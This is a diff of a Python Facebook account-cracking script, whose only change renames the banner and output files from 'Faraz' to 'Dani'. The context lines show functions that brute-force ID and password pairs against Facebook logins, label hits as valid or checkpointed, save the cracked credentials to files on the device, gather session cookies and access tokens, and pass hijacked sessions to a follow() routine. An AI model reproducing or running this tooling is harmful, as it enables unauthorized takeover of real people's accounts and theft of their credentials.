@@ -620,7 +620,7 @@ def crack(idf,pwv):
 
 	fff = '%'
 
-	sys.stdout.write('\r %s[ Faraz ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ Dani ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 
 	sys.stdout.flush()
 
@@ -650,7 +650,7 @@ def crack(idf,pwv):
 
 				cp +=1
 
-				print( f'\r\x1b[1;91m [ Faraz-CP ] {idf} | {pw}')
+				print( f'\r\x1b[1;91m [ Dani-CP ] {idf} | {pw}')
 
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 
@@ -664,7 +664,7 @@ def crack(idf,pwv):
 
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 
-				print(f'\r\x1b[1;92m [ Faraz-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ Dani-OK ] {idf} | {pw}')
 
 				wrt =('%s - %s' % (idf,pw))
 
@@ -698,7 +698,7 @@ def free(idf,pwv):
 
 	fff = '%'
 
-	sys.stdout.write('\r %s[ Faraz ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ Dani ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 
 	sys.stdout.flush()
 
@@ -726,7 +726,7 @@ def free(idf,pwv):
 
 			if "checkpoint" in po.cookies.get_dict().keys():
 
-				rint( f'\r\x1b[1;91m [ Faraz-CP ] {idf} | {pw}')
+				rint( f'\r\x1b[1;91m [ Dani-CP ] {idf} | {pw}')
 
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 
@@ -740,13 +740,13 @@ def free(idf,pwv):
 
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 
-				print(f'\r\x1b[1;92m [ Faraz-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ Dani-OK ] {idf} | {pw}')
 
 				wrt =('%s - %s' % (idf,pw))
 
 				ok.append(wrt)
 
-				open('/sdcard/Faraz-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/Dani-OK.txt','a').write('%s\n' % wrt)
 
 				follow(ses,coki)
 
@@ -1706,7 +1706,7 @@ class Main:
 
 				self.ok.append("%s|%s"%(uid, pw))
 
-				open("2009-Faraz-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-Dani-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 
 				break
 
@@ -1716,7 +1716,7 @@ class Main:
 
 				self.cp.append("%s|%s"%(uid, pw))
 
-				open("2009-Faraz-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-Dani-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 
 				break
 
@@ -2554,23 +2554,23 @@ class Main:
 
 			if "session_key" in response.text and "EAAA" in response.text:
 
-				print("\r \033[0;92m[ Faraz-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ Dani-OK ] %s | %s\033[0;97m         "%(uid, pw))
 
 				print ("\r \033[0;92m Congrats Bro ")
 
 				self.ok.append("%s|%s"%(uid, pw))
 
-				open("2009-Faraz-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-Dani-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 
 				break
 
 			elif "www.facebook.com" in response.json()["error_msg"]:
 
-				print("\r \033[0;92m[ Faraz-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ Dani-OK ] %s | %s\033[0;97m         "%(uid, pw))
 
 				self.cp.append("%s|%s"%(uid, pw))
 
-				open("2009-Faraz-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-Dani-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 
 				break
 
